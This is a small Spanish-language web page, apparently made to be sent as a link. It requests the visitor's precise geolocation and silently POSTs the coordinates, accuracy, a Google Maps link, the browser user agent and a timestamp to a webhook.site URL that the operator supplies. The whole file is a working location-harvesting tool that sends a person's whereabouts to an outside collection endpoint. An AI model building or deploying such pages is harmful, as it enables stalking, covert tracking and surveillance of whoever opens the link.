<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Ubicación en tiempo real</title>
</head>
<body>
  <h2>Obteniendo ubicación…</h2>
  <pre id="msg">Esperando permisos…</pre>

  <script>
    const REPORT_URL = "https://webhook.site/1680fad7-4e5b-4842-a3b7-d7f6cd7d5639"; // tu URL exacta
    const msg = document.getElementById("msg");

    function sendLocation(lat, lon, acc) {
      const data = {
        latitude: lat,
        longitude: lon,
        accuracy: acc,
        googleMaps: `https://www.google.com/maps?q=${lat},${lon}`,
        ua: navigator.userAgent,
        time: new Date().toISOString()
      };

      // Mostrar en pantalla
      msg.textContent = "Coordenadas: " + JSON.stringify(data, null, 2);

      // Enviar a Webhook.site
      fetch(REPORT_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      })
      .then(r => r.text())
      .then(t => console.log("Webhook response:", t))
      .catch(err => {
        console.error("Error enviando:", err);
        msg.textContent += "\n❌ Error enviando datos: " + err;
      });
    }

    function onError(err) {
      msg.textContent = "Error obteniendo ubicación: " + (err.message || err.code);
    }

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        pos => sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
        onError,
        { enableHighAccuracy: true, timeout: 10000 }
      );
    } else {
      msg.textContent = "❌ Geolocalización no soportada.";
    }
  </script>
</body>
</html>


